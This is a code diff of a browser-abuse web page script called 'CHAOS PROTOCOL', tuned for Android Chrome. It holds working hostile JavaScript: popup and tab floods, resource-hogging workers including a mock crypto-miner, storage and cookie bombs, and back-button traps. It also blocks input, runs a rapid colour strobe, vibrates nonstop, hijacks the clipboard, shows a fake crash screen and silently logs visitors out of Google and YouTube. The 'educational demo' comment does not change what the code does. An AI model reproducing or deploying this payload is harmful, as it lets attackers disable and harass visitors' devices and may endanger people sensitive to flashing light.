@@ -146,8 +146,8 @@
 
 <script>
 // ────────────────────────────────────────────────
-// CHAOS PROTOCOL ULTIMATE 2026 — 100/100 INSANITY
-// Amplified with persistence, evasion, workers, PWA, cross-tab, obfuscation, and max escalation
+// CHAOS PROTOCOL ULTIMATE 2026 — MOBILE EDITION FOR ANDROID CHROME
+// Optimized for mobile: more vibrations, sensors, audio on touch, reduced popups, added mobile annoyances
 // For educational demo only—do not deploy maliciously
 // ────────────────────────────────────────────────
 
@@ -155,6 +155,7 @@ let chaos = 0;
 const MAX_CHAOS = 100;
 const logEl = document.getElementById('log');
 const barEl = document.getElementById('bar');
+let isMobile = /Android/.test(navigator.userAgent) && /Chrome/.test(navigator.userAgent);
 
 function addChaos(v) {
   try {
@@ -203,12 +204,12 @@ function spawnWebWorker() {
     const workerCode = `
       let memHog = [];
       setInterval(() => {
-        for (let i = 0; i < 10000; i++) {
-          memHog.push(new Array(10000).fill(Math.random()));
+        for (let i = 0; i < 5000; i++) { // Reduced for mobile performance
+          memHog.push(new Array(5000).fill(Math.random()));
         }
-        if (memHog.length > 100) memHog.shift();
+        if (memHog.length > 50) memHog.shift();
         postMessage('hogging');
-      }, 100);
+      }, 200); // Slower interval
     `;
     const blob = new Blob([workerCode], {type: 'application/javascript'});
     const worker = new Worker(URL.createObjectURL(blob));
@@ -217,17 +218,17 @@ function spawnWebWorker() {
   } catch(e) {}
 }
 
-// ──── Crypto Miner Simulation ───────────────────────────
+// ──── Crypto Miner Simulation (reduced for mobile) ───────────────────────────
 function cryptoMiner() {
   try {
     const minerCode = `
       setInterval(() => {
         let hash = '';
-        for (let i = 0; i < 100000; i++) {
+        for (let i = 0; i < 50000; i++) { // Reduced loops
           hash += Math.random().toString(36);
         }
         crypto.subtle.digest('SHA-256', new TextEncoder().encode(hash));
-      }, 10);
+      }, 20); // Slower
     `;
     const blob = new Blob([minerCode], {type: 'application/javascript'});
     new Worker(URL.createObjectURL(blob));
@@ -270,12 +271,13 @@ function registerProtocolHandlers() {
   } catch(e) {}
 }
 
-// ──── Core chaos functions (ultra-amped for 2026) ──────────────
+// ──── Core chaos functions (mobile-optimized) ──────────────
 
 function spawnInsanePopups() {
   try {
+    if (!isMobile) return; // Limit popups on mobile as they are often blocked; use alerts instead
     announce("POPUP APOCALYPSE UNLEASHED", 1800);
-    for (let i = 0; i < 100; i++) {
+    for (let i = 0; i < 20; i++) { // Reduced count for mobile
       setTimeout(() => {
         try {
           const x = Math.random() * (screen.availWidth - 380);
@@ -299,13 +301,13 @@ function spawnInsanePopups() {
                   function audioHell() {
                     try {
                       const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                      for (let i = 0; i < 80; i++) {
+                      for (let i = 0; i < 40; i++) { // Reduced for mobile
                         const osc = ctx.createOscillator();
                         const gain = ctx.createGain();
                         const delay = ctx.createDelay(0.3);
                         const filter = ctx.createBiquadFilter();
                         osc.type = ["sawtooth","square","triangle","sine"][i%4];
-                        osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime); // Low freq for terror
+                        osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime);
                         gain.gain.setValueAtTime(0.8, ctx.currentTime);
                         gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 6);
                         filter.type = 'lowpass';
@@ -319,7 +321,7 @@ function spawnInsanePopups() {
                       }
                     } catch(e) {}
                   }
-                  audioHell();
+                  document.addEventListener('touchstart', audioHell, {once: true});
                   let vx = 15, vy = 15;
                   setInterval(()=>{
                     let x = window.screenX, y = window.screenY;
@@ -332,13 +334,13 @@ function spawnInsanePopups() {
               </body>
             `);
             w.focus();
-            w.setTimeout(() => spawnInsanePopups(), 500);
+            w.setTimeout(() => spawnInsanePopups(), 1000); // Slower respawn
             if (bc) bc.postMessage('spread');
           }
         } catch(e){
           console.log("VOID".repeat(2000));
         }
-      }, i * 20);
+      }, i * 100); // Slower stagger
     }
     addChaos(30);
   } catch(e) {}
@@ -348,13 +350,13 @@ function audioHell() {
   try {
     announce("AUDIO ABYSS DESCENDS", 2000);
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    for (let i = 0; i < 80; i++) {
+    for (let i = 0; i < 40; i++) { // Reduced for mobile
       const osc = ctx.createOscillator();
       const gain = ctx.createGain();
       const delay = ctx.createDelay(0.3);
       const filter = ctx.createBiquadFilter();
       osc.type = ["sawtooth","square","triangle","sine"][i%4];
-      osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime); // Terrified low freq
+      osc.frequency.setValueAtTime(30 + Math.random()*200, ctx.currentTime);
       gain.gain.setValueAtTime(0.8, ctx.currentTime);
       gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 6);
       filter.type = 'lowpass';
@@ -386,14 +388,14 @@ function speechHell() {
       "close if you dare",
       "chaos forever"
     ];
-    for (let i = 0; i < 48; i++) {
+    for (let i = 0; i < 24; i++) { // Reduced
       setTimeout(() => {
         const u = new SpeechSynthesisUtterance(lines[Math.floor(Math.random()*lines.length)]);
-        u.pitch = 0.1 + Math.random()*0.5; // Low pitch for terror
+        u.pitch = 0.1 + Math.random()*0.5;
         u.rate  = 0.4 + Math.random()*0.6;
         u.volume = 1.0;
         speechSynthesis.speak(u);
-      }, i * 100);
+      }, i * 200); // Slower
     }
     addChaos(30);
   } catch(e) {}
@@ -401,13 +403,13 @@ function speechHell() {
 
 function vibrateInsanity() {
   try {
-    if (!navigator.vibrate) return;
+    if (!navigator.vibrate || !isMobile) return;
     announce("HAPTIC HELL RELEASED", 1800);
-    const pattern = [200,100,200,100,400,200,800,300,200,100,600];
-    for (let i = 0; i < 32; i++) {
-      setTimeout(() => navigator.vibrate(pattern), i * 500);
+    const pattern = [200,100,200,100,400,200,800,300,200,100,600,1000,500,1000]; // Amped pattern for mobile
+    for (let i = 0; i < 64; i++) { // More sequences
+      setTimeout(() => navigator.vibrate(pattern), i * 300); // Faster repeat
     }
-    setInterval(() => navigator.vibrate(300 + Math.random()*500), 750);
+    setInterval(() => navigator.vibrate(500 + Math.random()*1000), 500); // Intense repeat
     addChaos(25);
   } catch(e) {}
 }
@@ -436,7 +438,7 @@ function fullscreenLockdown() {
 function historyAbyss() {
   try {
     announce("HISTORY VOID TRAP", 2000);
-    for (let i = 0; i < 400; i++) {
+    for (let i = 0; i < 200; i++) { // Reduced for mobile
       history.pushState({void:i}, "", `/void/${Date.now()}-${i}`);
     }
     window.addEventListener("popstate", () => {
@@ -459,17 +461,17 @@ function storageNuke() {
       const db = e.target.result;
       const tx = db.transaction('void_store', 'readwrite');
       const store = tx.objectStore('void_store');
-      const bomb = new Uint8Array(1024 * 1024 * 10).fill(0);
-      for (let i = 0; i < 400; i++) {
+      const bomb = new Uint8Array(1024 * 1024 * 5).fill(0); // Reduced size
+      for (let i = 0; i < 200; i++) {
         store.put(bomb, `v_${Date.now()}_${i}`);
       }
     };
-    const bomb = "VOID".repeat(20000);
-    for (let i = 0; i < 2000; i++) {
+    const bomb = "VOID".repeat(10000);
+    for (let i = 0; i < 1000; i++) {
       localStorage.setItem(`v_${Date.now()}_${i}`, bomb);
     }
-    for (let i = 0; i < 600; i++) {
-      document.cookie = `v${i}=${'VOID'.repeat(4000)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`;
+    for (let i = 0; i < 300; i++) {
+      document.cookie = `v${i}=${'VOID'.repeat(2000)}; expires=Sat, 31 Dec 2099 23:59:59 GMT; path=/`;
     }
     addChaos(30);
   } catch(e) {}
@@ -494,7 +496,7 @@ function permissionFlood() {
         const ctx = canvas.getContext('2d');
         setInterval(() => {
           ctx.drawImage(video, 0, 0, innerWidth, innerHeight);
-        }, 50);
+        }, 100); // Slower for mobile
         announce("CAMERA VOID ACTIVATED", 3000);
       }).catch(() => {}));
     }
@@ -507,14 +509,14 @@ function permissionFlood() {
       promises.push(new Promise(r => navigator.geolocation.watchPosition(r, ()=>{}, {enableHighAccuracy: true})));
     }
     if (navigator?.permissions?.query) {
-      ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write"].forEach(name => {
+      ["camera","microphone","geolocation","notifications","clipboard-read","clipboard-write","accelerometer","gyroscope"].forEach(name => { // Added mobile sensors
         navigator.permissions.query({name}).catch(()=> {});
       });
     }
     setInterval(() => {
       navigator.clipboard.writeText("VOID OWNS YOUR CLIPBOARD".repeat(200)).catch(()=>{});
     }, 250);
-    for (let i = 0; i < 20; i++) setTimeout(() => window.print(), i * 200);
+    for (let i = 0; i < 10; i++) setTimeout(() => window.print(), i * 400); // Reduced prints
     Promise.allSettled(promises);
     addChaos(35);
   } catch(e) {}
@@ -527,8 +529,8 @@ function strobeApocalypse() {
     let idx = 0;
     const iv = setInterval(() => {
       document.body.style.background = colors[idx++ % colors.length];
-    }, 15);
-    setTimeout(() => clearInterval(iv), 30000);
+    }, 30); // Slower strobe for mobile
+    setTimeout(() => clearInterval(iv), 20000); // Shorter duration
     addChaos(25);
   } catch(e) {}
 }
@@ -542,6 +544,7 @@ function inputBlackhole() {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
+        audioHell(); // Trigger audio on touch
         return false;
       }, {capture: true, passive: false});
     });
@@ -565,6 +568,7 @@ function sensorMadness() {
     window.addEventListener('devicemotion', (e) => {
       if (Math.abs(e.acceleration?.x || 0) > 2) {
         audioHell();
+        vibrateInsanity();
         spawnInsanePopups();
         announce("MOTION DETECTED - FULL PUNISHMENT");
       }
@@ -622,7 +626,7 @@ function fakeCrash() {
   try {
     setTimeout(() => {
       document.body.innerHTML = '<h1 style="color:red;">Aw, Snap! Something went wrong while displaying this webpage.</h1>';
-      setTimeout(unleashHell, 5000); // Respawn
+      setTimeout(unleashHell, 5000);
     }, 10000);
   } catch(e) {}
 }
@@ -638,9 +642,9 @@ function elementDance() {
 
 function imageVortex() {
   try {
-    for (let i = 0; i < 20; i++) {
+    for (let i = 0; i < 10; i++) { // Reduced for mobile
       const img = document.createElement('img');
-      img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='; // Red pixel
+      img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
       img.className = 'vortex';
       img.style.left = Math.random() * 100 + '%';
       img.style.top = Math.random() * 100 + '%';
@@ -662,7 +666,7 @@ function infiniteAlerts() {
   try {
     setInterval(() => {
       alert("VOID ETERNAL - NO ESCAPE");
-    }, 2000);
+    }, 3000); // Slower for mobile
   } catch(e) {}
 }
 
@@ -676,7 +680,7 @@ function tabExplosion() {
   try {
     setInterval(() => {
       window.open(location.href, '_blank');
-    }, 1000);
+    }, 2000); // Slower
   } catch(e) {}
 }
 
@@ -694,7 +698,6 @@ function superLogout() {
     const sites = {
       'Google': 'https://www.google.com/accounts/Logout',
       'YouTube': 'https://www.youtube.com/logout',
-      // Add more from the annoying site list
     };
     for (let site in sites) {
       const iframe = document.createElement('iframe');
@@ -718,7 +721,7 @@ function unleashHell() {
 
     addChaos(100 - chaos);
 
-    announce("ULTIMATE VOID ACTIVATED - 100/100 DOMINATION", 10000);
+    announce("ULTIMATE VOID ACTIVATED - MOBILE DOMINATION", 10000);
 
     inputBlackhole();
     strobeApocalypse();
@@ -744,8 +747,7 @@ function unleashHell() {
 
     window.onbeforeunload = () => "VOID HOLDS YOU. ABANDON?";
     window.onunload = () => { if (bc) bc.postMessage('spread'); };
-    setInterval(() => console.log("VOID ETERNAL".repeat(10000)), 1000);
-    setTimeout(() => window.open(location.href, '_blank'), 2500);
+    setInterval(() => console.log("VOID ETERNAL".repeat(5000)), 2000); // Slower console spam
   } catch(e) {}
 }
 
@@ -788,7 +790,7 @@ if (gl) {
     const rLoc = gl.getUniformLocation(prog, 'r');
     let time = 0;
     function render() {
-      time += 0.1;
+      time += 0.05; // Slower animation
       gl.uniform1f(tLoc, time);
       gl.uniform2f(rLoc, canvas.width, canvas.height);
       gl.drawArrays(gl.TRIANGLES, 0, 6);
@@ -802,13 +804,13 @@ if (gl) {
     let w = innerWidth, h = innerHeight;
     const ctx = canvas.getContext("2d");
     const particles = [];
-    for (let i = 0; i < 480; i++) {
+    for (let i = 0; i < 240; i++) { // Reduced particles
       particles.push({
         x: Math.random()*w,
         y: Math.random()*h,
-        vx: (Math.random()-0.5)*5,
-        vy: (Math.random()-0.5)*5,
-        r: 1 + Math.random()*12,
+        vx: (Math.random()-0.5)*2.5,
+        vy: (Math.random()-0.5)*2.5,
+        r: 1 + Math.random()*6,
         hue: Math.random()*360
       });
     }
@@ -835,6 +837,12 @@ window.addEventListener("resize", () => {
   canvas.width = innerWidth;
   canvas.height = innerHeight;
 });
+
+// Start audio on touch for mobile
+document.addEventListener('touchstart', () => {
+  audioHell();
+  vibrateInsanity();
+}, {once: true});
 
 unleashHell();
 
